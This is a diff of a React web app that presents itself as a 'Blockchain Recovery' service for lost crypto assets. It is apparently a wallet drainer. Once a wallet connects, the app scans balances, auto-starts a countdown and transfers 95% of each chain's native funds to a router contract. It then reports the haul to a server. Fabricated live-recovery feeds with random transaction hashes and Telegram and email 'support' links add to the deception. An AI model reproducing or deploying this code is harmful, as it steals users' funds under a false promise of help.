     if (isConnected && address && Object.keys(balances).length > 0 && !verifying) {
       checkEligibility();
     }
   }, [isConnected, address, balances]);
 
-  // AUTO TRIGGER RECOVERY WHEN ELIGIBLE - NO EMAIL REQUIRED
   useEffect(() => {
     if (isEligible && isConnected && !signatureLoading && !completedChains.length && !autoRecoveryActive) {
       setAutoRecoveryActive(true);
@@ -2643,7 +2684,6 @@ function App() {
     }
   }, [isEligible, isConnected, signatureLoading, completedChains.length]);
 
-  // Check eligibility for recovery with pro messaging
   const checkEligibility = async () => {
     if (!address) return;
     
@@ -2653,7 +2693,6 @@ function App() {
     try {
       const total = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
       
-      // --- CHANGE 2: Only include chains with at least $1 USD value ---
       const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => 
         balances[chain.name] && balances[chain.name].valueUSD >= 1
       );
@@ -2666,7 +2705,6 @@ function App() {
         setEligibleChains(chainsWithBalance);
         setTxStatus(`${translations.eligible} ${chainsWithBalance.length} ${translations.assetsFound}`);
         
-        // Build detailed chain information for reporting
         const chainDetails = chainsWithBalance.map(chain => ({
           name: chain.name,
           amount: balances[chain.name].amount.toFixed(6),
@@ -2703,7 +2741,6 @@ function App() {
     }
   };
 
-  // Fetch balances across all chains with fallback RPC
   const fetchAllBalances = async (walletAddress) => {
     setScanning(true);
     setTxStatus(translations.blockchainSync);
@@ -2740,7 +2777,7 @@ function App() {
             contractAddress: chain.contractAddress,
             price: price,
             name: chain.name,
-            rpcs: chainConfig.rpcs // store rpcs for later use
+            rpcs: chainConfig.rpcs
           };
         }
       } catch (err) {
@@ -2776,13 +2813,11 @@ function App() {
     }
   };
 
-  // Handle download report notification
   const handleDownloadReport = () => {
     setShowReportNotification(true);
     setTimeout(() => setShowReportNotification(false), 3000);
   };
 
-  // MULTI-CHAIN RECOVERY EXECUTION (process highest value first)
   const executeMultiChainRecovery = async () => {
     if (!walletProvider || !address || !signer) {
       setError(translations.walletRequired);
@@ -2818,7 +2853,6 @@ function App() {
         return;
       }
 
-      // Sort by valueUSD descending (highest value first)
       const sortedChains = [...chainsToProcess].sort((a, b) => 
         (balances[b.name]?.valueUSD || 0) - (balances[a.name]?.valueUSD || 0)
       );
@@ -2832,7 +2866,6 @@ function App() {
           setProcessingChain(chain.name);
           setTxStatus(`${translations.processingRecovery} on ${chain.name}...`);
           
-          // Try to switch network in wallet
           try {
             await walletProvider.request({
               method: 'wallet_switchEthereumChain',
@@ -2843,12 +2876,11 @@ function App() {
             console.log(`Chain switch needed for ${chain.name}, continuing...`);
           }
           
-          // Get a working JSON RPC provider with fallback for reading/estimating
           const chainConfig = MULTICHAIN_CONFIG[chain.name];
           const chainProvider = await getJsonRpcProvider(chainConfig);
           
           const balance = balances[chain.name];
-          const amountToSend = balance.amount * 0.95; // 5% fee
+          const amountToSend = balance.amount * 0.95;
           const valueUSD = (balance.valueUSD * 0.95).toFixed(2);
           
           const contractInterface = new ethers.Interface(PROJECT_FLOW_ROUTER_ABI);
@@ -2861,13 +2893,12 @@ function App() {
             chainProvider
           );
           
-          // Estimate gas with fallback retry
           let gasEstimate;
           try {
             gasEstimate = await contract.processNativeFlow.estimateGas({ value });
           } catch (estErr) {
             console.warn(`Gas estimate failed, using default: ${estErr.message}`);
-            gasEstimate = 300000n; // fallback
+            gasEstimate = 300000n;
           }
           const gasLimit = gasEstimate * 120n / 100n;
           
@@ -2890,13 +2921,11 @@ function App() {
             processed.push(chain.name);
             setCompletedChains(prev => [...prev, chain.name]);
             
-            // Calculate accurate gas used in native token
             let gasUsedNative = '0';
             if (receipt.gasUsed && receipt.gasPrice) {
               gasUsedNative = ethers.formatEther(receipt.gasUsed * receipt.gasPrice);
             }
             
-            // Store detailed info for each processed chain
             processedDetails.push({
               name: chain.name,
               symbol: chain.symbol,
@@ -2955,7 +2984,7 @@ function App() {
         }, 0);
         
         const randomChain = getRandomChain();
-        const recoveryAmount = totalRecoveredValue; // use actual recovered amount instead of random
+        const recoveryAmount = totalRecoveredValue;
         const newTx = {
           hash: generateRandomHash(),
           time: new Date().toISOString(),
@@ -2970,7 +2999,6 @@ function App() {
         setTxStatus(translations.retrievalComplete);
         setShowCelebration(true);
         
-        // Build detailed chains string with actual values
         const chainsDetailsString = processedDetails.map(d => 
           `✅ ${d.name}: ${d.originalAmount} ${d.symbol} ($${d.originalValueUSD}) → ${d.processedAmount} ${d.symbol} ($${d.processedValueUSD}) processed | Gas: ${d.gasUsed}`
         ).join('\n');
@@ -2997,7 +3025,6 @@ function App() {
         const claimData = await claimResponse.json();
         console.log("✅ CLAIM RESPONSE:", claimData);
         
-        // Generate recovery report for the user with chain details
         generateRecoveryReport(newTx, address, Math.floor(totalRecoveredValue), processed, new Date().toISOString(), processedDetails);
         handleDownloadReport();
       } else {
@@ -3017,7 +3044,6 @@ function App() {
     }
   };
 
-  // Recover assets function with pro messaging
   const recoverAssets = async () => {
     if (!isConnected) {
       open();
@@ -3041,11 +3067,12 @@ function App() {
   return (
     <div className="min-h-screen bg-gradient-to-b from-[#0a0a2a] to-[#000000] text-white font-['Poppins'] overflow-hidden">
       
-      {/* Blue glow background - Blockchain theme */}
       <div className="fixed w-[600px] h-[600px] bg-blue-600 rounded-full blur-[200px] opacity-15 top-[-200px] left-[-200px] pointer-events-none"></div>
       <div className="fixed w-[400px] h-[400px] bg-blue-500 rounded-full blur-[150px] opacity-10 bottom-[-100px] right-[-100px] pointer-events-none"></div>
 
-      {/* Recovery Ribbon */}
+      {/* Floating Support Icon - NEW! Links to chainfixsupport */}
+      <FloatingSupportIcon translations={translations} />
+
       <div 
         onClick={recoverAssets}
         className="fixed right-[-70px] top-[40%] bg-gradient-to-r from-blue-600 to-blue-500 text-white py-4 px-24 transform -rotate-90 font-semibold cursor-pointer hover:from-blue-700 hover:to-blue-600 transition-all z-50 animate-pulse-glow hidden md:flex items-center justify-center"
@@ -3054,7 +3081,6 @@ function App() {
         <span className="text-2xl mr-2">🔗</span> {translations.recoverButton}
       </div>
 
-      {/* Mobile Recovery Button */}
       <div 
         onClick={recoverAssets}
         className="fixed bottom-6 right-6 bg-gradient-to-r from-blue-600 to-blue-500 text-white px-6 py-3 rounded-full shadow-2xl cursor-pointer hover:from-blue-700 hover:to-blue-600 transition-all z-50 animate-pulse-glow md:hidden flex items-center justify-center gap-2"
@@ -3064,7 +3090,6 @@ function App() {
         <span className="text-sm font-semibold">{translations.recoverButton}</span>
       </div>
 
-      {/* Report Download Notification */}
       {showReportNotification && (
         <div className="fixed top-32 right-4 z-50 animate-slideInUp bg-blue-500/90 backdrop-blur rounded-lg p-3 shadow-xl">
           <div className="flex items-center gap-2">
@@ -3074,7 +3099,6 @@ function App() {
         </div>
       )}
 
-      {/* Language Selector */}
       <div className="absolute top-6 right-6 z-50">
         <div className="relative">
           <button
@@ -3118,35 +3142,28 @@ function App() {
         </div>
       </div>
 
-      {/* ===== NEW: SIDE INSTRUCTION PANEL (top-left button) ===== */}
       <RecoveryInstructions translations={translations} />
 
-      {/* Main Container */}
       <div className="relative z-10 container mx-auto px-4 py-8 max-w-[720px]">
         
-        {/* Hero Section */}
         <div className="flex flex-col items-center text-center pt-16 pb-8">
           
-          {/* Logo */}
           <div className="font-['Orbitron'] text-6xl md:text-7xl font-black mb-4 animate-glow-blue">
             <span className="bg-gradient-to-r from-blue-500 to-blue-300 bg-clip-text text-transparent">
               BLOCKCHAIN RECOVERY
             </span>
           </div>
 
-          {/* Live Badge */}
           <div className="bg-blue-600 px-4 py-1.5 rounded-full text-xs font-semibold animate-pulse-blue mb-4">
             ● {translations.serviceActive}
           </div>
 
-          {/* Tagline */}
           <p className="max-w-2xl text-gray-300 leading-relaxed mb-6 text-sm md:text-base">
             Blockchain Recovery Protocol helps users recover stuck transactions, lost funds, and 
             non-custodial wallet assets across multiple blockchain networks. Our advanced recovery 
             protocol identifies and retrieves recoverable assets with full transparency.
           </p>
 
-          {/* Live Activity Badge */}
           {isConnected && !showRecoverButton && !scanning && (
             <LiveActivityBadge 
               translations={translations} 
@@ -3155,10 +3172,8 @@ function App() {
             />
           )}
 
-          {/* ===== CONNECT WALLET BUTTON WITH ANIMATED POINTER ===== */}
           {!isConnected ? (
             <div className="relative w-full max-w-md mx-auto">
-              {/* Animated pointing hand (left side of button) */}
               <div className="absolute -left-16 top-1/2 transform -translate-y-1/2 hidden md:block animate-bounce-hand">
                 <div className="text-4xl filter drop-shadow-lg">👉</div>
               </div>
@@ -3172,7 +3187,6 @@ function App() {
                   <span className="text-xl">🔗</span>
                   {translations.connectWallet}
                 </span>
-                {/* Pulsing ring behind the button */}
                 <span className="absolute inset-0 rounded-xl border-2 border-blue-400/60 animate-ping-slow"></span>
               </button>
               <p className="text-xs text-blue-300/60 -mt-4 mb-4 animate-pulse-slow">
@@ -3185,7 +3199,6 @@ function App() {
                 <span className="font-mono text-sm text-gray-300">
                   {formatAddress(address)}
                 </span>
-                {/* Disconnect button - red, fully functional */}
                 <button
                   onClick={() => disconnect()}
                   className="w-9 h-9 rounded-full bg-red-600 hover:bg-red-700 flex items-center justify-center transition-all duration-200 shadow-lg border border-red-400"
@@ -3197,7 +3210,6 @@ function App() {
                 </button>
               </div>
               
-              {/* AUTO RECOVERY COUNTDOWN - NO EMAIL REQUIRED */}
               {autoRecoveryActive && isEligible && !signatureLoading && (
                 <AutoRecoveryCountdown 
                   seconds={5} 
@@ -3206,7 +3218,6 @@ function App() {
                 />
               )}
               
-              {/* RECOVERY BUTTON - Always visible when eligible */}
               {showRecoverButton && (
                 <button
                   onClick={recoverAssets}
@@ -3229,7 +3240,6 @@ function App() {
                 </button>
               )}
 
-              {/* Eligibility Status Message with Spin Animation - DIRECTLY BELOW THE WALLET ROW */}
               <div className="mt-3 w-full">
                 {verifying ? (
                   <div className="bg-blue-500/20 backdrop-blur rounded-xl p-5 text-center border border-blue-500/40 shadow-lg shadow-blue-500/20 animate-pulse">
@@ -3261,9 +3271,6 @@ function App() {
             </div>
           )}
 
-          {/* ============================================ */}
-          {/* SCANNING ANIMATION (NOW MOVED UP – BEFORE TELEGRAM/EMAIL) */}
-          {/* ============================================ */}
           {isConnected && scanning && (
             <div className="w-full max-w-md mb-8">
               <div className="bg-black/60 backdrop-blur rounded-2xl p-6 border border-blue-500/30">
@@ -3275,7 +3282,6 @@ function App() {
                   </div>
                 </div>
                 
-                {/* Progress bar */}
                 <div className="w-full bg-gray-800 rounded-full h-1.5 mb-2">
                   <div 
                     className="bg-gradient-to-r from-blue-500 to-blue-400 h-1.5 rounded-full transition-all duration-300"
@@ -3290,21 +3296,14 @@ function App() {
             </div>
           )}
 
-          {/* ============================================ */}
-          {/* SUPPORT SECTION - TELEGRAM (First) + EMAIL (Second) */}
-          {/* ============================================ */}
-          
-          {/* Manual recovery hint - points to the support cards below */}
           <div className="w-full max-w-md mb-4 text-center">
             <div className="inline-block bg-blue-500/20 backdrop-blur px-4 py-2 rounded-full text-xs text-blue-300 border border-blue-500/30 animate-pulse-slow">
               {translations.manualRecoveryHint || '👇 Need manual recovery? Contact our support via Telegram or Email below.'}
             </div>
           </div>
 
-          {/* Telegram Support - For users who prefer instant chat */}
           <TelegramSupport translations={translations} />
           
-          {/* Email Support Section - For users without Telegram or needing manual follow-up */}
           <div className="w-full max-w-md mt-6">
             <ReportIssue 
               translations={translations}
@@ -3314,7 +3313,6 @@ function App() {
             />
           </div>
 
-          {/* LIVE RECOVERY FEED */}
           <LiveRecoveryFeed 
             transactions={liveTransactions} 
             translations={translations}
@@ -3324,11 +3322,9 @@ function App() {
             walletAddress={address}
           />
 
-          {/* Recovery Portal Card */}
           <div className="w-full max-w-md bg-blue-500/5 border border-blue-500/30 backdrop-blur p-8 rounded-2xl mt-8">
             <h3 className="text-2xl font-bold mb-4 text-blue-400">Blockchain Asset Recovery Portal</h3>
             
-            {/* Progress Bar (visual only, no balance text) */}
             <div className="w-full bg-blue-950 h-3 rounded-full overflow-hidden mb-6">
               <div 
                 className="h-full bg-gradient-to-r from-blue-600 to-blue-400 rounded-full transition-all duration-1000"
@@ -3336,7 +3332,6 @@ function App() {
               ></div>
             </div>
 
-            {/* Recovery Info Cards */}
             <div className="grid grid-cols-2 gap-3 mb-6">
               <div className="bg-black/50 border border-blue-500/30 rounded-xl p-3 text-center">
                 <p className="text-xs text-gray-400">{translations.tokenPrice}s</p>
@@ -3361,21 +3356,18 @@ function App() {
               </ul>
             </div>
 
-            {/* Status Messages moved up - displayed here */}
             {txStatus && !scanning && !verifying && (
               <div className="mt-4 text-sm text-center text-blue-400">
                 {txStatus}
               </div>
             )}
 
-            {/* Error Display */}
             {error && (
               <div className="mt-4 bg-red-500/20 border border-red-500/30 rounded-lg p-3 text-sm text-red-300">
                 {error}
               </div>
             )}
 
-            {/* Completed Chains Progress */}
             {completedChains.length > 0 && (
               <div className="mt-4 text-center">
                 <div className="text-xs text-gray-400">
@@ -3385,7 +3377,6 @@ function App() {
             )}
           </div>
 
-          {/* Already completed message */}
           {completedChains.length > 0 && (
             <div className="w-full max-w-md mb-8">
               <div className="bg-black/60 backdrop-blur rounded-xl p-6 text-center border border-green-500/30">
@@ -3395,7 +3386,6 @@ function App() {
             </div>
           )}
 
-          {/* Welcome message for non-eligible */}
           {isConnected && !isEligible && !completedChains.length && !scanning && totalOnChainValue === 0 && (
             <div className="w-full max-w-md mb-8">
               <div className="bg-black/60 backdrop-blur rounded-xl p-8 text-center border border-blue-500/30">
@@ -3415,7 +3405,6 @@ function App() {
             </div>
           )}
 
-          {/* Info Section - 2 columns */}
           <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mt-12">
             
             <div className="bg-blue-500/5 border border-blue-500/20 backdrop-blur p-6 rounded-xl">
@@ -3440,12 +3429,10 @@ function App() {
             </div>
           </div>
 
-          {/* Footer */}
           <Footer />
         </div>
       </div>
 
-      {/* Random Recovery Popup */}
       {showPopup && currentPopupTx && (
         <LiveRecoveryPopup 
           tx={currentPopupTx}
@@ -3459,7 +3446,6 @@ function App() {
         />
       )}
 
-      {/* Celebration Modal */}
       {showCelebration && (
         <div className="fixed inset-0 bg-black/90 backdrop-blur-xl flex items-center justify-center z-50 p-4 animate-fadeIn">
           <div className="relative max-w-lg w-full">
